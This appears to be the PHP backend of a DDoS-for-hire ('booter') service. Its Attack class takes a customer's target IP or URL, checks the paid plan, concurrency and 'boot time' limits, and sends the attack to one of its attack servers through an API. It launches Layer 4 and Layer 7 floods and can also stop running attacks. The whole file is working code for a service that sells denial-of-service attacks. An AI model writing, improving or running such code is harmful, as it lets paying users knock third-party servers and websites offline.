<?php

if (!defined('allow')) {
    header("HTTP/1.0 404 Not Found");
}

if (!defined('k90plearptJQXxFZR2l7LRp8V')) {
    die('includes not found');
}

class Attack
{

    public function Layer4($target, $port, $time, $method, $pps)
    {
        global $User;
        global $Plan;
        global $Api;
        global $ALogs;
        global $BlackList;
        global $Methods;
        global $Main;
        global $Client;
        global $Logs;
        global $Admin;

        $Addons = explode('|', $User->UserData()['addons']);
        $plan_concurrents = $Plan->PlanDataID($User->UserData()['plan'])['concurrents'] + $Addons[0];
        $running_attacks = $ALogs->UserAttacks($User->UserData()['id'])['Count'] + 1;

        if ($Main->Data()['layer4'] == true) {
            $rMsg = ['error', 'Maintenance in progress.'];
            echo json_encode($rMsg);
            die();
        }

        if ($User->UserData()['expire'] < time()) {
            $rMsg = ['error', 'Your Plan is expired.'];
            echo json_encode($rMsg);
            die();
        }

        if (!filter_var($target, FILTER_VALIDATE_IP)) {
            $rMsg = ['error', 'Target is invalid.'];
            echo json_encode($rMsg);
            die();
        }

        if ($port < 1 || $port > 65535) {
            $rMsg = ['error', 'Port must be higher than 1 and lower than 65535.'];
            echo json_encode($rMsg);
            die();
        }

        if ($time > $Plan->PlanDataID($User->UserData()['plan'])['mbt'] + $Addons[1]) {
            $rMsg = ['error', 'Your maximum attack duration is ' . $Plan->PlanDataID($User->UserData()['plan'])['mbt'] + $Addons[1] . '.'];
            echo json_encode($rMsg);
            die();
        }

        if ($Methods->MethodsDataID($method)['layer'] != 4) {
            $rMsg = ['error', 'This method doesnt exist.'];
            echo json_encode($rMsg);
            die();
        }

        if ($Methods->MethodsDataID($method)['class'] != 0) {
            if ($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 0) {
                $rMsg = ['error', 'This method requires paid plan.'];
                echo json_encode($rMsg);
                die();
            }
        }

        if ($Methods->MethodsDataID($method)['class'] == 2) {
            if ($Plan->PlanDataID($User->UserData()['plan'])['premium'] != 1) {
                $rMsg = ['error', 'This method requires premium plan.'];
                echo json_encode($rMsg);
                die();
            }
        }

        foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
            if (strpos($target, $BLv['word'])) {
                $Message = $BLv['detail'];
                if ($BLv['expires'] > time()) {
                    $rMsg = ['error', "Target $target is blacklisted."];
                    echo json_encode($rMsg);
                    die();
                }
            }
        }

        $MethodSource = $Methods->MethodsDataID($method)['name'];
        $servers = $Api->ApiDataAll()['Response'];
        $available_servers = array();


        foreach ($servers as $server) {
            if ($server['status'] != 1 && $server['layer'] == 4) {
                // Get the server's supported methods and check if the specified method is supported
                $methods = explode('|', $Api->ApiDataID($server['id'], 1)['methods']);
                if (in_array($MethodSource, $methods)) {
                    // Calculate the server's load and add it to the list of available servers
                    if ($server['slots'] > 0) {
                        $loaded = ($Api->CountApiOfAttacks($server['id']) / $server['slots']) * 100;
                        if ($loaded < 100) {
                            $available_servers[] = $server;
                        }
                    }
                }
            }
        }

        // Sort the available servers based on the lastUsed time
        usort($available_servers, function ($a, $b) {
            return $a['lastUsed'] - $b['lastUsed'];
        });

        // Select the first server in the sorted list
        if (!empty($available_servers)) {
            $serverID = $available_servers[0]['id'];
        }

        if (empty($serverID)) {
            $eMSG = ['error', "All servers are busy, please wait."];
            echo json_encode($eMSG);
            die();
        }

        if ($Api->CountApiOfAttacks($serverID) >= $Api->ApiDataID($serverID, 1)['slots']) {
            $eMSG = ['error', "All servers are busy, please wait."];
            echo json_encode($eMSG);
            die();
        }

        // Set the API link
        $api_link = $Api->ApiDataID($serverID, 1)['link'];
        $ServerName = $Api->ApiDataID($serverID, 1)['name'];

        // Set the default values for the action and mode parameters
        $default_action = "start";

        // Set the default name from method id
        $method = $Methods->MethodsDataID($method)['name'];

        // Use a regular expression to find all of the parameter placeholders in the API link
        $pattern = "/\[([^\]]+)\]/";

        // Use preg_replace_callback to replace the placeholders with their corresponding values
        $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $target, $port, $time, $method, $pps) {
            // Get the parameter name from the matches
            $param_name = $matches[1];

            // Check the parameter name and return the corresponding value
            switch ($param_name) {
                case "action":
                    return $default_action;
                case "target":
                    return $target;
                case "time":
                    return $time;
                case "method":
                    return $method;
                case "port":
                    return $port;
                case "pps":
                    return $pps;
                default:
                    return "";
            }
        }, $api_link);

        // Set the URL, HTTP headers, and timeout options for the request
        $options = [
            'url' => $api_link,
            'headers' => [
                'cache-control' => 'no-cache',
                'content-type' => 'application/x-www-form-urlencoded',
            ],
            'timeout' => 5,
        ];

//        file_put_contents("startl4.json", json_encode($options));

        try {
            // Send the HTTP request and get the response
            $response = $Client->request('GET', $options['url'], [
                'headers' => $options['headers'],
                'timeout' => $options['timeout'],
                'verify' => false,
            ]);

            $data = [
                'response' => json_decode($response->getBody()->getContents(), true)
            ];


            $stopper = isset($data['response']['stopper']) ? $data['response']['stopper'] : 0;

            // Return a success message
            $eMSG = ['success', "Attack started: $running_attacks/$plan_concurrents"];
            echo json_encode($eMSG);

            // Log the attack
            $ALogs->CreateLog($User->UserData()['id'], $target, 'empty', $time, $port, $Methods->MethodsDataName($method)['id'], $stopper, $Api->ApiDataID($serverID, 1)['id'], 'hub', '4', '' . $pps . '');

            //Set timestamp of lastUsed
            $Api->LastUsed($serverID);

        } catch (\Exception $e) {

//            file_put_contents ("startl7.json" , json_encode ($e));

            //Set timestamp of lastUsed
            $Api->LastUsed($serverID);

            // If the error disable the API
//            $Api -> disableAPI ($serverID);

            // Return an error message
            $rMsg = ['error', 'Error sending request to server. ID: ' . $serverID];
            echo json_encode($rMsg);
        }
    }

    public function Layer7($target, $time, $method, $ratelimit, $requestmethod, $postdata, $cookie, $reconnection)
    {
        global $User;
        global $Plan;
        global $Api;
        global $ALogs;
        global $BlackList;
        global $Methods;
        global $Main;
        global $Client;
        global $Admin;

        $Addons = explode('|', $User->UserData()['addons']);

        $plan_concurrents = $Plan->PlanDataID($User->UserData()['plan'])['concurrents'] + $Addons[0];
        $running_attacks = $ALogs->UserAttacks($User->UserData()['id'])['Count'] + 1;

        if ($Admin->AdminAllow() != true) {
            if ($Main->Data()['layer7'] == true) {
                $rMsg = ['error', 'Tehnical work in progress, please try again later.'];
                echo json_encode($rMsg);
                die();
            }
        }


        if ($User->UserData()['expire'] < time()) {
            $rMsg = ['error', 'Your Plan is expired.'];
            echo json_encode($rMsg);
            die();
        }

        // Remove any forbidden symbols from the target URL
        $target = preg_replace('/[\{\}\$\|\[\]]/', '', $target);

        // Validate the target URL
        if (filter_var($target, FILTER_VALIDATE_URL) === false) {
            $rMsg = ['error', 'Target is invalid.'];
            echo json_encode($rMsg);
            die();
        }

        $Time = $Plan->PlanDataID($User->UserData()['plan'])['mbt'] + $Addons[1];

        if ($time > $Time) {
            $rMsg = ['error', 'Your maximum boot time is ' . $Time . '.'];
            echo json_encode($rMsg);
            die();
        }

        if (!($Methods->MethodsDataID($method)['layer']) == 7) {
            $rMsg = ['error', 'This method doesnt exist.'];
            echo json_encode($rMsg);
            die();
        }

        if ($Methods->MethodsDataID($method)['class'] != 0) {
            if ($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 0) {
                $rMsg = ['error', 'This method requires paid plan.'];
                echo json_encode($rMsg);
                die();
            }
        }

        if ($Methods->MethodsDataID($method)['class'] == 2) {
            if ($Plan->PlanDataID($User->UserData()['plan'])['premium'] != 1 && $Addons[3] != 0) {
                $rMsg = ['error', 'This method requires a premium access.'];
                echo json_encode($rMsg);
                die();
            }
        }

        if (($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 0)) {
            $host = parse_url($target, PHP_URL_HOST);
            if ($ALogs->abuseCheck($host)['Count'] >= 1) {
                $rMsg = ['error', 'Don\'t abuse free plan.'];
                echo json_encode($rMsg);
                die();
            }
        }

        $domain = preg_replace('/^www\./i', '', parse_url($target, PHP_URL_HOST));
        $blacklist = $BlackList->BlackListDataAll()['Response'];
        $isAllowed = $Admin->AdminAllow();

        foreach ($blacklist as $blacklistItem) {
            if (!$isAllowed && (stripos($domain, $blacklistItem['word']) !== false || stripos($target, $blacklistItem['word']) !== false)) {
                $message = $blacklistItem['ID'];
                echo json_encode(['error', "Target Blacklisted #$message"]);
                die();
            }
        }

        $MethodSource = $Methods->MethodsDataID($method)['name'];
        $servers = $Api->ApiDataAll()['Response'];
        $available_servers = array();
        $methodFound = false;

        foreach ($servers as $server) {
            if ($server['status'] != 1 && $server['layer'] == 7) {
                // Get the server's supported methods and check if the specified method is supported
                $methods = explode('|', $Api->ApiDataID($server['id'], 1)['methods']);
                if (in_array($MethodSource, $methods)) {
                    // Method found in at least one server
                    $methodFound = true;

                    // Calculate the server's load and add it to the list of available servers
                    if ($server['slots'] > 0) {
                        $loaded = ($Api->CountApiOfAttacks($server['id']) / $server['slots']) * 100;
                        if ($loaded < 100) {
                            $available_servers[] = $server;
                        }
                    }
                }
            }
        }

        if (!$methodFound) {
            // The specified method is not found in any server, so show an error
            $eMSG = ['error', "The server is not accessible or cannot accept the attack, try again later"];
            echo json_encode($eMSG);
            die();
        }

        // Sort the available servers based on the lastUsed time
        usort($available_servers, function ($a, $b) {
            return $a['lastUsed'] - $b['lastUsed'];
        });

        // Select the first server in the sorted list
        if (!empty($available_servers)) {
            $serverID = $available_servers[0]['id'];
        }

        if (empty($serverID)) {
            $eMSG = ['error', "All servers are busy, please wait."];
            echo json_encode($eMSG);
            die();
        }

        if ($Api->CountApiOfAttacks($serverID) >= $Api->ApiDataID($serverID, 1)['slots']) {
            $eMSG = ['error', "All servers are busy, please wait."];
            echo json_encode($eMSG);
            die();
        }


        // Set the API link
        $api_link = $Api->ApiDataID($serverID, 1)['link'];
        $ServerName = $Api->ApiDataID($serverID, 1)['name'];

        // Set the default values for the action and mode parameters
        $default_action = "start";

        // Set the default name from method id
        $method = $Methods->MethodsDataID($method)['name'];

        // Use a regular expression to find all of the parameter placeholders in the API link
        $pattern = "/\[([^\]]+)\]/";

        // Use preg_replace_callback to replace the placeholders with their corresponding values
        $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $target, $time, $method, $requestmethod, $postdata, $ratelimit, $cookie, $reconnection) {
            // Get the parameter name from the matches
            $param_name = $matches[1];

            // Check the parameter name and return the corresponding value
            switch ($param_name) {
                case "action":
                    return $default_action;
                case "target":
                    return base64_encode($target);
                case "time":
                    return $time;
                case "method":
                    return $method;
                case "ratelimit":
                    return $ratelimit;
                case "requestmethod":
                    return $requestmethod;
                case "postdata":
                    return base64_encode($postdata);
                case "cookie":
                    return base64_encode($cookie);
                case "reconnection":
                    return $reconnection;
                default:
                    return "";
            }
        }, $api_link);

        // Set the URL, HTTP headers, and timeout options for the request
        $options = [
            'url' => $api_link,
            'headers' => [
                'cache-control' => 'no-cache',
                'content-type' => 'application/x-www-form-urlencoded',
            ],
            'timeout' => 2,
        ];


        try {

            $host = parse_url($target, PHP_URL_HOST);
            $ALogs->CreateLog($User->UserData()['id'], $target, $host, $time, '0', $Methods->MethodsDataName($method)['id'], $source_stopper = rand(10, 9999999), $Api->ApiDataID($serverID, 1)['id'], 'hub', '7');


            // Send the HTTP request and get the response
            $response = $Client->request('GET', $options['url'], [
                'headers' => $options['headers'],
                'timeout' => $options['timeout'],
                'verify' => false,
            ]);

            $data = [
                'response' => json_decode($response->getBody()->getContents(), true)
            ];

            $stopper = isset($data['response']['stopper']) ? $data['response']['stopper'] : 0;

            $ALogs->UpdateLog($source_stopper, $stopper);

            // Return a success message
            $eMSG = ['info', "Attack started: $running_attacks/$plan_concurrents"];
            echo json_encode($eMSG);

            // Log the attack

            //Set timestamp of lastUsed
            $Api->LastUsed($serverID);

        } catch (\Exception $e) {
            $Api->LastUsed($serverID);
            $ALogs->DeleteLog($source_stopper);


            $Api->disableAPI($serverID);

            // Return an error message
            $rMsg = ['error', 'Error sending request to server. ID: ' . $serverID];
            echo json_encode($rMsg);
        }
    }

    public function Stop($ID)
    {
        global $ALogs;
        global $Api;
        global $Client;
        global $DataBase;

        $Data = $ALogs->LogsDataID($ID, 1);

        //Define variables
        $stopper = urlencode($Data['stopper']);
        $serverID = $Data['handler'];

        $target = urlencode($Data['target']);
        $time = $Data['time'];
        $port = $Data['port'];


        // Set the API link
        $api_link = $Api->ApiDataID($Data['handler'], 1)['link'];

        // Set the default values for the action and mode parameters
        $default_action = "stop";

        // Use a regular expression to find all of the parameter placeholders in the API link
        $pattern = "/\[([^\]]+)\]/";

        // Use preg_replace_callback to replace the placeholders with their corresponding values
        $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $stopper, $target, $time, $port) {
            // Get the parameter name from the matches
            $param_name = $matches[1];

            // Check the parameter name and return the corresponding value
            switch ($param_name) {
                case "action":
                    return $default_action;
                case "target":
                    return $target;
                case "time":
                    return $time;
                case "port":
                    return $port;
                case "stopper":
                    return $stopper;
                case "method":
                    return $default_action;
                default:
                    return "";
            }
        }, $api_link);

        // Set the URL, HTTP headers, and timeout options for the request
        $options = [
            'url' => $api_link,
            'headers' => [
                'cache-control' => 'no-cache',
                'content-type' => 'application/x-www-form-urlencoded',
            ],
            'timeout' => 1,
        ];


        try {
            // Send the HTTP request and get the response
            $response = $Client->request('GET', $options['url'], [
                'headers' => $options['headers'],
                'timeout' => $options['timeout'],
            ]);

            // Return a success message
            $eMSG = ['info', "Attack stopped"];
            echo json_encode($eMSG);

            $DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:id");
            $DataBase->Bind(':id', $ID);
            $DataBase->Execute();

        } catch (\Exception $e) {
            $eMSG = ['info', 'Attack deleted, server return error.' . $serverID];
            echo json_encode($eMSG);

            $DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:id");
            $DataBase->Bind(':id', $ID);
            $DataBase->Execute();
        }
    }

    public function StopAll()
    {
        global $DataBase;
        global $Api;
        global $ALogs;
        global $User;
        global $Client;

        if ($User->UserData()['expire'] < time()) {
            $rMsg = ['error', 'Your Plan is expired.'];
            die(json_encode($rMsg));
        }

        $errors = []; // Initialize an array to store errors

        foreach ($ALogs->UserAttacks($User->UserData()['id'])['Response'] as $Ak => $Av) {

            if (empty($ALogs->LogsDataID($Av['id'], 1)['handler'])) {
                continue; // Skip this iteration if handler does not exist
            }

            $Base = $ALogs->LogsDataID($Av['id'], 1);
            // Define variables
            $stopper = urlencode($Base['stopper']);

            // Set the API link
            $api_link = $Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['link'];

            // Set the default values for the action and mode parameters
            $default_action = "stop";

            // Use a regular expression to find all of the parameter placeholders in the API link
            $pattern = "/\[([^\]]+)\]/";

            // Use preg_replace_callback to replace the placeholders with their corresponding values
            $api_link = preg_replace_callback($pattern, function ($matches) use ($default_action, $stopper) {
                // Get the parameter name from the matches
                $param_name = $matches[1];

                // Check the parameter name and return the corresponding value
                switch ($param_name) {
                    case "action":
                        return $default_action;
                    case "stopper":
                        return $stopper;
                    default:
                        return "";
                }
            }, $api_link);

            $options = [
                'url' => $api_link,
                'headers' => [
                    'cache-control' => 'no-cache',
                    'content-type' => 'application/x-www-form-urlencoded',
                ],
                'timeout' => 5,
            ];

            try {
                // Send the HTTP request and get the response
                $response = $Client->request('GET', $options['url'], [
                    'headers' => $options['headers'],
                    'timeout' => $options['timeout'],
                ]);

                $data = [
                    'response' => json_decode($response->getBody()->getContents(), true)
                ];


                // Update attack logs
                $DataBase->Query("UPDATE `attack_logs` SET `stopped`=:stopped WHERE `id`=:sID");
                $DataBase->Bind(':sID', $Av['id']);
                $DataBase->Bind(':stopped', '1');
                $DataBase->Execute();

            } catch (\Exception $e) {
                $errors[] = 'Error sending request to server.'; // Add error to the array
                continue;
            }

        }

        if (!empty($errors)) {
            $response = ['warning', implode(' ', $errors)]; // Join errors into a string
            echo json_encode($response);
        } else {
            $response = ['success', "Attacks stopped"];
            echo json_encode($response);
        }
    }

    public function StopAllAdmin()
    {
        global $DataBase, $Api, $ALogs, $User, $Client, $Admin;

        if (!$Admin->AdminAllow()) {
            $response = ['error', 'You need to be an administrator'];
            echo json_encode($response);
            die();
        }

        $logsDataRunning = $ALogs->LogsDataRunning()['Response'];

        if (empty($logsDataRunning)) {
            $response = ['warning', 'Running attack not found'];
            echo json_encode($response);
            die();
        }

        $errors = [];

        foreach ($logsDataRunning as $av) {
            $base = $ALogs->LogsDataID($av['id'], 1);
            $stopper = urlencode($base['stopper']);

            // Check if ApiDataID returns false
            $apiData = $Api->ApiDataID($base['handler'], 1);

            if (!$apiData) {
                continue; // Skip this iteration if handler does not exist
            }

            $apiLink = $apiData['link'];

            $defaultAction = "stop";

            $apiLink = preg_replace_callback(
                "/\[([^\]]+)\]/",
                function ($matches) use ($defaultAction, $stopper) {
                    $paramName = $matches[1];
                    switch ($paramName) {
                        case "action":
                            return $defaultAction;
                        case "stopper":
                            return $stopper;
                        default:
                            return "";
                    }
                },
                $apiLink
            );

            $options = [
                'url' => $apiLink,
                'headers' => [
                    'cache-control' => 'no-cache',
                    'content-type' => 'application/x-www-form-urlencoded',
                ],
                'timeout' => 2,
            ];

            try {
                $response = $Client->request('GET', $options['url'], [
                    'headers' => $options['headers'],
                    'timeout' => $options['timeout'],
                ]);

                $data = [
                    'response' => json_decode($response->getBody()->getContents(), true)
                ];

                $DataBase->Query("UPDATE `attack_logs` SET `stopped`=:stopped WHERE `id`=:sID");
                $DataBase->Bind(':sID', $av['id']);
                $DataBase->Bind(':stopped', '1');
                $DataBase->Execute();
            } catch (\Exception $e) {
                $errors[] = $e->getMessage();
            }
        }

        if (empty($errors)) {
            $response = ['success', "Attacks stopped"];
            echo json_encode($response);
        } else {
            $response = ['warning', 'Error sending request to servers'];
            echo json_encode($response);
        }
    }


}

?>
